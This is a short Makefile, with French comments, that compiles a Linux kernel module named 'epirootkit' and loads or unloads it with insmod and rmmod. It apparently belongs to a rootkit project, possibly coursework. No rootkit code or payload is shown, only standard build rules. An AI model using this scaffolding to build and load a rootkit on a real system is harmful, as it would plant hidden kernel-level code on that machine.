# Configuration
KERNEL_DIR := /lib/modules/$(shell uname -r)/build
MODULE_NAME := epirootkit

# Flags de compilation
EXTRA_CFLAGS += -Wall -Wextra -Wno-unused-parameter -Wno-unused-function -Wno-unused-variable
EXTRA_CFLAGS += -DDEBUG
EXTRA_CFLAGS += -DCONFIG_DEBUG_SECTION_MISMATCH=y
EXTRA_CFLAGS += -DCONFIG_X86_32=n
EXTRA_CFLAGS += -DCONFIG_MODULE_UNLOAD=y
EXTRA_CFLAGS += -DCONFIG_MODULE_FORCE_UNLOAD=y

# Objets à compiler
obj-m := $(MODULE_NAME).o

# Règles principales
all:
	@echo "Compilation du module kernel..."
	@make -C $(KERNEL_DIR) M=$(PWD) modules CONFIG_DEBUG_SECTION_MISMATCH=y

clean:
	@echo "Nettoyage des fichiers de compilation..."
	@rm -f *.o *.ko *.mod.c *.mod.o *.symvers *.order
	@rm -f .*.cmd
	@rm -rf .tmp_versions

# Installation
install: all
	@echo "Installation du module..."
	@if lsmod | grep -q "$(MODULE_NAME)"; then \
		echo "Déchargement du module existant..."; \
		rmmod $(MODULE_NAME); \
	fi
	@insmod $(MODULE_NAME).ko

uninstall:
	@echo "Désinstallation du module..."
	@if lsmod | grep -q "$(MODULE_NAME)"; then \
		rmmod $(MODULE_NAME); \
	fi

.PHONY: all clean install uninstall
